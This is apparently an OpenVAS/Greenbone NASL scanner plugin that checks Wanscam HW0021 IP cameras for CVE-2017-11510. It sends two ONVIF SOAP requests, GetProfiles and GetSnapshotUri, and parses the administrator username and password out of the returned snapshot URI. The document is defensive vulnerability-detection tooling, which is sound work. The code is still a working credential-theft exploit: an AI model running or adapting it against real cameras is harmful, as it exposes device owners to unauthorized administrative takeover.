if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.113147" );
	script_version( "2021-06-15T02:00:29+0000" );
	script_tag( name: "last_modification", value: "2021-06-15 02:00:29 +0000 (Tue, 15 Jun 2021)" );
	script_tag( name: "creation_date", value: "2018-04-03 12:20:00 +0200 (Tue, 03 Apr 2018)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-09 23:22:00 +0000 (Wed, 09 Oct 2019)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_cve_id( "CVE-2017-11510" );
	script_name( "Wanscam HW0021 Administrator Credentials Disclosure" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Wanscam HW0021 discloses admin credentials to unauthenticated users." );
	script_tag( name: "vuldetect", value: "The script tries to acquire the admin credentials." );
	script_tag( name: "insight", value: "The URL returned from a GetSnapshotUri request against the ONVIF SOAP Service
  running on the HW0021 camera includes an administrative username and password as cleartext in the GET-parameter." );
	script_tag( name: "impact", value: "Successful exploitation would allow an attacker to acquire administrative
  access to the target device." );
	script_tag( name: "affected", value: "Wanscam HW0021." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "https://www.tenable.com/security/research/tra-2017-33" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 8080 );
res = http_get_cache( port: port, item: "/" );
if(!IsMatchRegexp( res, "http://www.onvif.org/ver10/media/wsdl" )){
	exit( 0 );
}
host = http_host_name( port: port );
soap = NASLString( "<?xml version='1.0' encoding='UTF-8'?>\\r\\n", "<SOAP-ENV:Envelope xmlns:SOAP-ENV='http://www.w3.org/2003/05/soap-envelope' xmlns:tds='http://www.onvif.org/ver10/media/wsdl'>\\r\\n", "<SOAP-ENV:Body>\\r\\n", "<tds:GetProfiles/>\\r\\n", "</SOAP-ENV:Body>\\r\\n", "</SOAP-ENV:Envelope>\\r\\n" );
req = http_post_put_req( port: port, url: "/", data: soap, add_headers: make_array( "Content-Type", "text/xml; charset=UTF-8" ) );
res = http_keepalive_send_recv( data: req, port: port, bodyonly: FALSE );
token_match = eregmatch( string: res, pattern: "trt:Profiles[^>]*token=\"([^\"]*)\"" );
if(isnull( token_match[1] )){
	exit( 0 );
}
token = token_match[1];
soap = NASLString( "<?xml version='1.0' encoding='UTF-8'?>\\r\\n", "<SOAP-ENV:Envelope xmlns:SOAP-ENV='http://www.w3.org/2003/05/soap-envelope' xmlns:tds='http://www.onvif.org/ver10/media/wsdl'>\\r\\n", "<SOAP-ENV:Body>\\r\\n", "<tds:GetSnapshotUri>\\r\\n", "<tds:ProfileToken>", token, "</tds:ProfileToken>\\r\\n", "</tds:GetSnapshotUri>\\r\\n", "</SOAP-ENV:Body>\\r\\n", "</SOAP-ENV:Envelope>\\r\\n" );
req = http_post_put_req( port: port, url: "/", data: soap, add_headers: make_array( "Content-Type", "text/xml; charset=UTF-8" ) );
res = http_keepalive_send_recv( data: req, port: port, bodyonly: FALSE );
url_match = eregmatch( string: res, pattern: "<tt:Uri>([^>]*)</tt:Uri>" );
if(!isnull( url_match[1] )){
	url = url_match[1];
	user_match = eregmatch( string: url, pattern: "-usr=([^&]*)&" );
	pwd_match = eregmatch( string: url, pattern: "-pwd=([^&]*)&" );
	if(!isnull( user_match[1] ) && !isnull( pwd_match[1] )){
		report = "It was possible to acquire administrative credentials. Username: '" + user_match[1] + "', Password: '" + pwd_match[1] + "'";
		security_message( data: report, port: port );
		exit( 0 );
	}
}
exit( 99 );

